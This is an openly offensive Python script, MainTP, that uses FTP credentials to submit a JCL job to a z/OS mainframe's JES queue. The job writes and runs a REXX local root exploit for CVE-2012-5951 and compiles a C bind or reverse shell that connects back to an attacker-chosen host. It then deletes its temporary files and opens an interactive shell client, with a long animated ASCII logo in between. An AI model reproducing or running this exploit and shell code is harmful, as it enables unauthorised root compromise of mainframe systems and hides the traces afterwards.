#!/usr/bin/python

#########################################################################
#			         MainTP                                 #
#########################################################################
# Mainframe Backdoor Script:						#
#  On z/OS users can submit jobs (or JCL) via FTP (using site file=JES) #
#  jobs can also execute programs in OMVS (or UNIX) by calling          #
#  BPXBATCH and pasing the shell commands to run. This program generates#
#  a JCL which creates a C program, compiles it, and executes it using  #
#  a privilege escalation exploit to obtain UID 0.                      #
#                                                                       #
#  The uploaded JCL contains an implementation of CVE-2012-5951         #
#  originally discovered by whomever perpetrated the Logica mainframe   #
#  breach.                                                              #
#                                                                       #
# Refer to https://github.com/mainframed/logica/blob/master/kuku.rx for #
# original local root exploit on OMVS                                   # 
#                                                                       #
# Requirements: Python, z/OS FTP Server username/password and the right #
#               access rights.						#
# Created by: Soldier of Fortran (@mainframed767)               	#
# Usage: Given an IP address, username and password this script will  	#
# connect to an FTP server, convert it to JES mode and submit a job.    #
# The job executes compiles then executes a binary which either binds   #
# a shell or creates a reverse shell.                                   #
#                                                               	#
# Copyright GPL 2013                                             	#
#########################################################################

from ftplib import FTP #For FTP stuff
import time #needed for sleep
import os #to manipulate people... uh I mean files
import string #to generate file names
import random #samesies
from random import randrange #random file name
import sys #to sleep
import socket #to talk to bind/reverse shell
from select import select #what what?
import signal
import argparse 

#EBCDIC/ASCII converter, customized by SoF for use here
#from http://www.pha.com.au/kb/index.php/Ebcdic.py
a2e = [
      0,  1,  2,  3, 55, 45, 46, 47, 22,  5, 21, 11, 12, 13, 14, 15,
     16, 17, 18, 19, 60, 61, 50, 38, 24, 25, 63, 39, 28, 29, 30, 31,
     64, 79,127,123, 91,108, 80,125, 77, 93, 92, 78,107, 96, 75, 97,
    240,241,242,243,244,245,246,247,248,249,122, 94, 76,126,110,111,
    124,193,194,195,196,197,198,199,200,201,209,210,211,212,213,214,
    215,216,217,226,227,228,229,230,231,232,233, 74,224, 90, 95,109,
    121,129,130,131,132,133,134,135,136,137,145,146,147,148,149,150,
    151,152,153,162,163,164,165,166,167,168,169,192,106,208,161,  7,
     32, 33, 34, 35, 36, 21,  6, 23, 40, 41, 42, 43, 44,  9, 10, 27,
     48, 49, 26, 51, 52, 53, 54,  8, 56, 57, 58, 59,  4, 20, 62,225,
     65, 66, 67, 68, 69, 70, 71, 72, 73, 81, 82, 83, 84, 85, 86, 87,
     88, 89, 98, 99,100,101,102,103,104,105,112,113,114,115,116,117,
    118,119,120,128,138,139,140,141,142,143,144,154,155,156,157,158,
    159,160,170,171,172,173,174,175,176,177,178,179,180,181,182,183,
    184,185,186,187,188,189,190,191,202,203,204,205,206,207,218,219,
    220,221,222,223,234,235,236,237,238,239,250,251,252,253,254,255
    ]

e2a = [
      0,  1,  2,  3,156,  9,134,127,151,141, 11, 11, 12, 13, 14, 15,
     16, 17, 18, 19,157, 10,  8,135, 24, 25,146,143, 28, 29, 30, 31,
    128,129,130,131,132, 10, 23, 27,136,137,138,139,140,  5,  6,  7,
    144,145, 22,147,148,149,150,  4,152,153,154,155, 20, 21,158, 26,
     32,160,161,162,163,164,165,166,167,168, 91, 46, 60, 40, 43, 33,
     38,169,170,171,172,173,174,175,176,177, 93, 36, 42, 41, 59, 94,
     45, 47,178,179,180,181,182,183,184,185,124, 44, 37, 95, 62, 63,
    186,187,188,189,190,191,192,193,194, 96, 58, 35, 64, 39, 61, 34,
    195, 97, 98, 99,100,101,102,103,104,105,196,197,198,199,200,201,
    202,106,107,108,109,110,111,112,113,114,203,204,205,206,207,208,
    209,126,115,116,117,118,119,120,121,122,210,211,212,213,214,215,
    216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,
    123, 65, 66, 67, 68, 69, 70, 71, 72, 73,232,233,234,235,236,237,
    125, 74, 75, 76, 77, 78, 79, 80, 81, 82,238,239,240,241,242,243,
     92,159, 83, 84, 85, 86, 87, 88, 89, 90,244,245,246,247,248,249,
     48, 49, 50, 51, 52, 53, 54, 55, 56, 57,250,251,252,253,254,255
]

def AsciiToEbcdic(s):
    if type(s) != type(""):
        raise "Bad data", "Expected a string argument"

    if len(s) == 0:  return s

    new = ""

    for i in xrange(len(s)):
	#print s[i],":",ord(s[i])
        new += chr(a2e[ord(s[i])])

    return new

def EbcdicToAscii(s):
    if type(s) != type(""):
        raise "Bad data", "Expected a string argument"

    if len(s) == 0:  return s

    new = ""

    for i in xrange(len(s)):
	#print s[i],":",ord(s[i])	
        new += chr(e2a[ord(s[i])])

    return new

# This function generates a random filename for us to use, size will always be size-1
def rand_name(size=8, chars=string.ascii_letters):
	return ''.join(random.choice(chars) for x in range( 1, size ))

##Colours for us to use
class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'

    def disable(self):
        self.HEADER = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''

def jcl_creator(connection_type,username,ip="0.0.0.0",port="4444"):
	
	job_name = username + rand_name(2)
	rexx_file = rand_name(randrange(3,6))
	source_file = rand_name(randrange(3,6))
	exec_file = rand_name(randrange(3,6))

	jcl_head = "//"+job_name.upper()+" JOB ("+username.upper()+'''),'SOF',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
//CREATERX  EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
//             PATHDISP=(KEEP,DELETE),
//             FILEDATA=TEXT,
//             PATH='/tmp/'''+rexx_file+''''
//SYSUT1    DD DATA,DLM=##
/* REXX */
/* Modified from the Logica Breach investigation */
call syscalls('ON')
if __argv.2=='MSF4' then do
  address syscall 'setuid 0'
  address syscall 'getuid'
  myuid=retval
/*  say "uid is " myuid */
env.0=1
env.1='PATH=/bin:/sbin/usr/sbin:/usr/bin'
 call bpxwunix '/tmp/'''+exec_file+'''',,,,env.
 exit
end
/* say 'l3tz g3t s0m3 0f d4t r00t!@#' */
parm.0=2
parm.1=__argv.1
parm.2='MSF4'
env.0=1
env.1='_BPC_SHAREAS=NO'
address syscall 'spawn /usr/lpp/netview/v5r3/bin/cnmeunix 0 . parm. env.'
address syscall 'wait wret.'
##
//CREATECS  EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
//             PATHDISP=(KEEP,DELETE),
//             FILEDATA=TEXT,
//             PATH='/tmp/'''+source_file+'''.c'
//SYSUT1    DD DATA,DLM=##\n'''

	if(connection_type == 'reverse'):
		c_code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
 int i , sockfd;
 struct sockaddr_in sin;
 sockfd = socket(AF_INET,SOCK_STREAM,0);
 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr=inet_addr("'''+ip+'''");
 sin.sin_port=htons('''+str(port)+''');
 connect(sockfd,(struct sockaddr *)&sin,sizeof(struct sockaddr_in));
 dup2(sockfd,2);
 dup2(sockfd,1);
 dup2(sockfd,0);
 printf("Y0u n0w h4v3 r00t\\n");
 execl("/bin/sh","sh",NULL);
return EXIT_SUCCESS;
}\n'''

	else:
		c_code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
 int result , sockfd;
 int port;
 struct sockaddr_in sin;
 sockfd = socket(AF_INET,SOCK_STREAM,0);
 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr = 0;
 sin.sin_port = htons('''+str(port)+''');
 bind (sockfd,(struct sockaddr *)&sin,sizeof(sin));
 listen(sockfd,5);
 result = accept (sockfd,NULL,0);
 dup2(result,2);
 dup2(result,1);
 dup2(result,0);
 printf("Y0u n0w h4v3 r00t\\n");
 execl("/bin/sh","sh",NULL);
return EXIT_SUCCESS;
}\n'''

	jcl_foot = '''##
//OMGLOL    EXEC PGM=BPXBATCH,REGION=800M
//*STDOUT    DD PATH='/tmp/mystd.out',PATHOPTS=(OWRONLY,OCREAT),
//*             PATHMODE=SIRWXU
//*STDERR    DD PATH='/tmp/mystd.err',PATHOPTS=(OWRONLY,OCREAT),
//*             PATHMODE=SIRWXU
//STDPARM   DD *
SH cd /tmp;
cc -o /tmp/'''+exec_file+''' /tmp/'''+source_file+'''.c;
chmod +x /tmp/'''+rexx_file+''';
/tmp/'''+rexx_file+''';
rm /tmp/'''+rexx_file+''';
rm /tmp/'''+source_file+'''.c;
rm /tmp/'''+exec_file+''';
/*'''

	return jcl_head + c_code + jcl_foot

def manhattan_transfer_logo(sleep=0.05):
# Just prints an animated logo on a dare
# Jump to line 475 to skip this
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                                                   ,------|
| |                                                                  /''|```||
| |                                                                 |---'---'|
| |                                                                 ,_    ___| 
| |                                                                  '---'(O)|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                                           ,--------------|
| |                                                          /''|```|```|```||
| |                                                         |---'---'---'---'|
| |                                                         ,_    ______     | 
| |                                                          '---'(O)(O)'----|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                                ,-------------------------|
| |                                               /''|```|```|```|```|```|```|
| |                                              |---'---'---'---'---'---'---|
| |                                              ,_    ______           _____| 
| |                                               '---'(O)(O)'---------'(O)(O|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                  ,-------------------------------.  .----|
| |                                 /''|```|```|```|```|```|```|``|` | |```|`|
| |                                |---'---'---'---'---'---'---'--'--| |---'-|
| |                                ,_    ______           ______     |_,_    | 
| |                                 '---'(O)(O)'---------'(O)(O)'---'   '---'|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                   ,-------------------------------.  .-------------------|
| |                  /''|```|```|```|```|```|```|``|` | |```|```|```|```|```||
| |                 |---'---'---'---'---'---'---'--'--| |---'---'---'---'---'|
| |                 ,_    ______           ______     |_,_    ______         | 
| |                  '---'(O)(O)'---------'(O)(O)'---'   '---'(O)(O)'--------|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |            ,-------------------------------.  .--------------------------|
| |           /''|```|```|```|```|```|```|``|` | |```|```|```|```|```|```|```|
| |          |---'---'---'---'---'---'---'--'--| |---'---'---'---'---'---'---|
| |          ,_    ______           ______     |_,_    ______           _____| 
| |           '---'(O)(O)'---------'(O)(O)'---'   '---'(O)(O)'---------'(O)(O|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |  ,-------------------------------.  .-------------------------------.  | |
| | /''|```|```|```|```|```|```|``|` | |```|```|```|```|```|```|```|``|``| | |
| ||---'---'---'---'---'---'---'--'--| |---'---'---'---'---'---'---'--'--| | |
| |,_    ______           ______     |_,_    ______           ______     | | | 
| | '---'(O)(O)'---------'(O)(O)'---'   '---'(O)(O)'---------'(O)(O)'---'  | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
|-------------------.  .-------------------------------.                   | |
|`|```|```|```|``|` | |```|```|```|```|```|```|```|``|``|                  | |
|-'---'---'---'--'--| |---'---'---'---'---'---'---'--'--|                  | |
|        ______     |_,_    ______           ______     |                  | | 
|-------'(O)(O)'---'   '---'(O)(O)'---------'(O)(O)'---'                   | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
|-----.  .-------------------------------.                                 | |
|``|` | |```|```|```|```|```|```|```|``|``|                                | |
|--'--| |---'---'---'---'---'---'---'--'--|                                | |
|     |_,_    ______           ______     |                                | | 
|'---'   '---'(O)(O)'---------'(O)(O)'---'                                 | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
|--------------------------.                                               | |
|`|```|```|```|```|```|``|``|                                              | |
|-'---'---'---'---'---'--'--|                                              | |
|_____           ______     |                                              | | 
|O)(O)'---------'(O)(O)'---'                                               | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
|--------.                                                                 | |
|```|``|``|                                                                | |
|---'--'--|                                                                | |
|____     |                                                                | | 
|)(O)'---'                                                                 | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                                                        | |
| |                                                                        | |
| |                                                                        | |
| |                                                                        | | 
| |                                                                        | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
|--------.                                                                 | |
|```|``|``|                                                                | |
|---'--'--|                                                                | |
|____     |                                                                | | 
|)(O)'---'                                                                 | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
|--------------------------.                                               | |
|`|```|```|```|```|```|``|``|                                              | |
|-'---'---'---'---'---'--'--|                                              | |
|_____           ______     |                                              | | 
|O)(O)'---------'(O)(O)'---'                                               | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
|-----.  .-------------------------------.                                 | |
|``|` | |```|```|```|```|```|```|```|``|``|                                | |
|--'--| |---'---'---'---'---'---'---'--'--|                                | |
|     |_,_    ______           ______     |                                | | 
|'---'   '---'(O)(O)'---------'(O)(O)'---'                                 | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
|-------------------.  .-------------------------------.                   | |
|`|```|```|```|``|` | |```|```|```|```|```|```|```|``|``|                  | |
|-'---'---'---'--'--| |---'---'---'---'---'---'---'--'--|                  | |
|        ______     |_,_    ______           ______     |                  | | 
|-------'(O)(O)'---'   '---'(O)(O)'---------'(O)(O)'---'                   | |
|============================================================================|		
'''+ bcolors.ENDC

	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |  ,-------------------------------.  .-------------------------------.  | |
| | /''|```|```|```|```|```|```|``|` | |```|```|```|```|```|```|```|``|``| | |
| ||---'---'---'---'---'---'---'--'--| |---'---'---'---'---'---'---'--'--| | |
| |,_    ______           ______     |_,_    ______           ______     | | | 
| | '---'(O)(O)'---------'(O)(O)'---'   '---'(O)(O)'---------'(O)(O)'---'  | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |            ,-------------------------------.  .--------------------------|
| |           /''|```|```|```|```|```|```|``|` | |```|```|```|```|```|```|```|
| |          |---'---'---'---'---'---'---'--'--| |---'---'---'---'---'---'---|
| |          ,_    ______           ______     |_,_    ______           _____| 
| |           '---'(O)(O)'---------'(O)(O)'---'   '---'(O)(O)'---------'(O)(O|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                   ,-------------------------------.  .-------------------|
| |                  /''|```|```|```|```|```|```|``|` | |```|```|```|```|```||
| |                 |---'---'---'---'---'---'---'--'--| |---'---'---'---'---'|
| |                 ,_    ______           ______     |_,_    ______         | 
| |                  '---'(O)(O)'---------'(O)(O)'---'   '---'(O)(O)'--------|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                  ,-------------------------------.  .----|
| |                                 /''|```|```|```|```|```|```|``|` | |```|`|
| |                                |---'---'---'---'---'---'---'--'--| |---'-|
| |                                ,_    ______           ______     |_,_    | 
| |                                 '---'(O)(O)'---------'(O)(O)'---'   '---'|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                                ,-------------------------|
| |                                               /''|```|```|```|```|```|```|
| |                                              |---'---'---'---'---'---'---|
| |                                              ,_    ______           _____| 
| |                                               '---'(O)(O)'---------'(O)(O|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                                           ,--------------|
| |                                                          /''|```|```|```||
| |                                                         |---'---'---'---'|
| |                                                         ,_    ______     | 
| |                                                          '---'(O)(O)'----|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                                                   ,------|
| |                                                                  /''|```||
| |                                                                 |---'---'|
| |                                                                 ,_    ___| 
| |                                                                  '---'(O)|
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| ''' +bcolors.GREEN+"Mainframe Trapdoor PROTOCOL ( M T P ) By Soldier of Fortran @mainframed767"+bcolors.ENDC+''' |
| |                                                                        | |
| |                                                                        | |
| |                                                                        | |
| |                                                                        | | 
| |                                                                        | |
|============================================================================|		
'''+ bcolors.ENDC
	time.sleep(sleep)
	os.system('clear')
	print '''
/ \                                                                        / \\
| |                   ''' +bcolors.GREEN+ "Mainframe Trapdoor: PROTOCOL"+bcolors.ENDC+'''                         | |
| |                                                                        | |
| |                             '''+bcolors.RED+"MainTP.py"+bcolors.ENDC+'''                                  | |
| |                                                                        | |
| |                '''+bcolors.YELLOW+"By Soldier of Fortran @mainframed767"+bcolors.ENDC+'''                    | | 
| |                                                                        | |
|============================================================================|		
'''+ bcolors.ENDC

	return "choo choo!"


# catch the ctrl-c to exit and say something instead of Punt!
def signal_handler(signal, frame):
        print 'Kick!'
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
##########################################################
#Gather the argumers we need
parser = argparse.ArgumentParser(description='MainTP: Given an FTP server IP address give you a root shell either in listener or reverse shell!')
parser.add_argument('ip',help='The z/OS Mainframe FTP Server IP or Hostname')
parser.add_argument('username',help='a valid FTP userid')
parser.add_argument('password',help='users password')
parser.add_argument('-p','--port',help='z/OS FTP port, default is 21',default="21",dest='FTP_port')
group = parser.add_mutually_exclusive_group()
group.add_argument('-l','--listener',help='listener (bind) shell',action='store_true',default=False,dest='listener')
group.add_argument('-r','--reverse',help='reverse shell',action='store_true',default=False,dest='reverse')
parser.add_argument('--rport',help='Listener port. If it fails try >1024',default='4444',dest='rport')
parser.add_argument('--lhost',help='Remote server to call back to (aka Your IP address)',dest='lhost')
parser.add_argument('--lport',help='Remote port to use',default='4444',dest='lport')
parser.add_argument('--print',help='Just print the JCL to the screen',action='store_true',default=False,dest='dotmatrix')
parser.add_argument('--logo',help='Ugly ASCII Art Logo. Its sorta my thing now.', default=False,dest='logo',action='store_true')
parser.add_argument('-v','--verbose',help='Verbose mode. More verbosity', default=False,dest='debug',action='store_true')
#parser.add_argument('','',help='',dest='')
results = parser.parse_args() 


server = False #Until threading is implemented this will serve as a stopgap. 

if results.logo:
	lol = manhattan_transfer_logo(0.20)

if results.listener:
	JCL = jcl_creator('bind',results.username,"0.0.0.0",results.rport)
else:
	JCL = jcl_creator('reverse',results.username,results.lhost,results.lport)

if results.dotmatrix:
        print bcolors.GREEN+JCL+bcolors.ENDC
        sys.exit(0)

#Connect to the mainframe FTP server
print bcolors.BLUE + "[+] Connecting to:", results.ip,":",results.FTP_port, "" + bcolors.ENDC

if results.debug:
	print bcolors.YELLOW + "{!} - Verbose mode enabled"
	print bcolors.YELLOW + "{!} - Mainframe FTP Server:"+bcolors.GREEN+"",results.ip, "" + bcolors.ENDC
	print bcolors.YELLOW + "{!} - FTP Server Port:"+bcolors.GREEN+"",results.FTP_port, "" + bcolors.ENDC
	print bcolors.YELLOW + "{!} - FTP Username:"+bcolors.GREEN+"", results.username, "" + bcolors.ENDC
	print bcolors.YELLOW + "{!} - FTP Password:"+bcolors.GREEN+"", results.password, "" + bcolors.ENDC
	if results.port != None: print bcolors.YELLOW + "{!} - Listener Port:"+bcolors.GREEN+"", results.port, "" + bcolors.ENDC

try:	
	MTP = FTP()
	MTP.connect(results.ip, results.FTP_port)
	MTP.login(results.username, results.password)
	if results.debug: print bcolors.YELLOW + "{!} - Connected to:"+bcolors.GREEN+"", results.ip,":",results.port, "" + bcolors.ENDC
except Exception, e:
    	print  bcolors.RED + "[ERR] could not connect to ",results.ip,":",results.FTP_port,"" + bcolors.ENDC
	print bcolors.RED + "",e,"" + bcolors.ENDC
	sys.exit(0)


print bcolors.BLUE + "[+] Switching to JES mode" + bcolors.ENDC

try: 
        MTP.voidcmd( "site file=JES" )
        print bcolors.BLUE + "[+] Inserting JCL in to job queue"+ bcolors.ENDC 
except Exception, e:
        print  bcolors.RED + "[ERR] Could not switch to JES mode. If \"command not understood\" are you sure this is even a mainframe?" + bcolors.ENDC
        print bcolors.RED + "",e,"" + bcolors.ENDC
        sys.exit(0)


#### create temp files to upload
TEMP_JCL_FILE = '/tmp/rand.jcl' 
TEMP_JCL = open(TEMP_JCL_FILE,'w')
TEMP_JCL.write(JCL) 
TEMP_JCL.close()

try:
        jcl_upload = MTP.storlines( 'STOR %s' % results.username.upper(), open(TEMP_JCL_FILE,'rb')) # upload temp file to JES queue
        os.remove(TEMP_JCL_FILE) # delete the  tmp file
except Exception, e:
        os.remove(TEMP_JCL_FILE) #remove the tmp file
        print  bcolors.RED + "[ERR] could not upload JCL file" + bcolors.ENDC
        print bcolors.RED + "",e,"" + bcolors.ENDC
        sys.exit(0)

print bcolors.BLUE + "[+] Job " + bcolors.YELLOW + jcl_upload.split()[6] +bcolors.BLUE+ " added to JES queue" + bcolors.ENDC

print bcolors.BLUE + "[+] Cleaning up..." + bcolors.ENDC
#------------------ Begin NetEBCDICat ----------------------

if results.listener:
	
	time.sleep(15) 

        try:
                print bcolors.BLUE + "[+] Connecting Shell on port",results.rport,
                MFsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                MFsock.connect( (results.ip, int(results.rport)) )
                print ".....Done!" + bcolors.ENDC
        except Exception, e:
                print  bcolors.RED + "[ERR] could not connect to ",results.ip,":",results.rport,"" + bcolors.ENDC
                print bcolors.RED + "",e,"" + bcolors.ENDC
                sys.exit(0)

if results.reverse:
        try:
                print bcolors.BLUE + "[+] Connecting Reverse Shell - Waiting for z/OS!" + bcolors.ENDC                
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind((socket.gethostname(), int(results.lport))) 
                server.listen(1)
                MFsock, address = server.accept()
        except Exception, e:
                print bcolors.RED + "[ERR] could not open server on port:", results.lport,"" + bcolors.ENDC
                print bcolors.RED + "",e,"" + bcolors.ENDC
                sys.exit(0)

MFsock.setblocking(0)
while(1):
	r, w, e = select(
		[MFsock, sys.stdin], 
		[], 
		[MFsock, sys.stdin])
	try:
		buffer = MFsock.recv(128)
		while( buffer  != ''):
			ascii_out = EbcdicToAscii(buffer)
			print ascii_out,
			buffer = MFsock.recv(128)
                if(buffer == ''):
			break;
	except socket.error:
                pass
	
	while(1):
		r, w, e = select([sys.stdin],[],[],0)
		if(len(r) == 0):
			break;
		c = raw_input()
		if(c == ''):
			break;
		c += "\n"
		command = AsciiToEbcdic(c)
		if(MFsock.sendall(command) != None):
			break;
